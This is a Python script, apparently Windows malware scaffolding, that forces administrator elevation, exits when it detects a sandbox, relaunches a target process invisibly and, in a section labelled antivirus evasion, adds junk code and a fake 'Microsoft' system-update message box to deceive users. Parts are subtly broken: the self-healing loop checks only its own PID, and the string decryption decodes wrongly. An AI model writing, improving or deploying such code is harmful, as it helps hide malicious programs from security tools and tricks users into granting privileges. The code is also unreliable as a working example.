# protector.py
import os
import sys
import time
import ctypes
import psutil
import winreg
import hashlib
import random
import subprocess
from threading import Thread

# ================= 保护配置 =================
PROTECTED_PROCESS = "target.exe"    # 要保护的进程名
SELF_HEAL_INTERVAL = 15            # 自愈检查间隔（秒）
OBFUSCATION_KEY = 0x7A             # 异或加密密钥

# ================= 核心保护功能 =================
class StringObfuscator:
    """ 字符串加密模块 """
    def __init__(self, key=OBFUSCATION_KEY):
        self.key = key
    
    def encrypt(self, s):
        return bytes([ord(c) ^ self.key for c in s]).decode('latin-1')
    
    def decrypt(self, s):
        return bytes([ord(c) ^ self.key for c in s]).decode('utf-8')

def require_admin():
    """ 强制提权运行 """
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{__file__}"', None, 1
        )
        sys.exit()

def anti_sandbox():
    """ 反沙箱检测 """
    try:
        # 检测内存和运行时间
        if (psutil.virtual_memory().total < 4*1024**3 or 
            time.time() - psutil.boot_time() < 300):
            sys.exit(0)
    except:
        pass

def process_stealth():
    """ 基础进程隐藏 """
    try:
        import win32process
        handle = win32process.GetCurrentProcess()
        win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
    except:
        pass

def self_healing():
    """ 自愈守护线程 """
    while True:
        try:
            current_pid = os.getpid()
            if not psutil.pid_exists(current_pid):
                subprocess.Popen(
                    [sys.executable, PROTECTED_PROCESS],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                break
            time.sleep(SELF_HEAL_INTERVAL)
        except:
            pass

def init_protection():
    """ 初始化保护措施 """
    require_admin()
    anti_sandbox()
    process_stealth()
    Thread(target=self_healing, daemon=True).start()

# ================= 免杀增强 =================
def junk_code():
    """ 生成干扰代码 """
    [hashlib.md5(str(x).encode()).hexdigest() for x in range(random.randint(10,20))]

def fake_behavior():
    """ 伪装正常行为 """
    ctypes.windll.user32.MessageBoxW(0, 
        "正在准备系统更新...", 
        "Microsoft 系统工具", 
        0x40
    )

if __name__ == "__main__":
    init_protection()
    junk_code()
    fake_behavior()